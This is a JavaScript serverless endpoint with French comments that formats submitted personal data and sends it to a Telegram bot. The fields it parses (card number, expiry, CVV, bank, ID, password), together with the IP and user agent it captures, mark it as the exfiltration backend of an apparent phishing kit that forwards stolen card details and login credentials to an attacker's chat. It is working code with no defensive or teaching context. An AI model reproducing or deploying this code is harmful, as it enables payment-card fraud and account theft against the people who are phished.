// api/notify.js
const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT  = process.env.CHAT_ID;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { message } = req.body;
  if (!message) {
    return res.status(400).json({ error: 'Missing message' });
  }

  // Récupère IP et User-Agent
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // Date & heure
  const now   = new Date();
  const date  = now.toLocaleDateString('fr-FR');
  const time  = now.toLocaleTimeString('fr-FR');

  // Construction du message fun
  // Sépare header (première ligne) et détails (le reste)
  const [ header, ...lines ] = message.split('\n');
  let text = `📣 *${header}*`;               // gros header en gras
  text += `\n──────────────────`;
  lines.forEach(line => {
    if      (line.startsWith('Nom:'))        text += `\n👤 ${line.slice(4).trim()}`;
    else if (line.startsWith('Prénom:'))     text += `\n🙋 ${line.slice(7).trim()}`;
    else if (line.startsWith('Téléphone:'))  text += `\n📞 ${line.slice(10).trim()}`;
    else if (line.startsWith('Email:'))      text += `\n✉️ ${line.slice(6).trim()}`;
    else if (line.startsWith('Adresse:'))    text += `\n🏠 ${line.slice(8).trim()}`;
    else if (line.startsWith('Numéro:'))     text += `\n💳 ${line.slice(7).trim()}`;
    else if (line.startsWith('Exp:'))        text += `\n📅 ${line.slice(4).trim()}`;
    else if (line.startsWith('CVV:'))        text += `\n🔒 ${line.slice(4).trim()}`;
    else if (line.startsWith('Banque:'))     text += `\n🏦 ${line.slice(7).trim()}`;
    else if (line.startsWith('ID:'))         text += `\n🆔 ${line.slice(3).trim()}`;
    else if (line.startsWith('Pass:'))       text += `\n🔑 ${line.slice(5).trim()}`;
    else                                     text += `\n📋 ${line.trim()}`;
  });
  text += `\n──────────────────`;
  text += `\n🌐 *IP* : \`${ip}\``;
  text += `\n🔎 *Agent* : \`${ua}\``;
  text += `\n🕓 *Date* : _${date} ${time}_`;
  text += `\n©️ ${now.getFullYear()}`;

  // Appel POST JSON à Telegram (en Markdown)
  const url     = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  const payload = {
    chat_id: CHAT,
    text,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };

  const telegramRes = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  // Lit et renvoie la réponse brute
  const raw  = await telegramRes.text();
  let body;
  try { body = JSON.parse(raw); } catch { body = raw; }

  const status = telegramRes.ok ? 200 : telegramRes.status;
  return res.status(status).json({ ok: telegramRes.ok, full: body });
}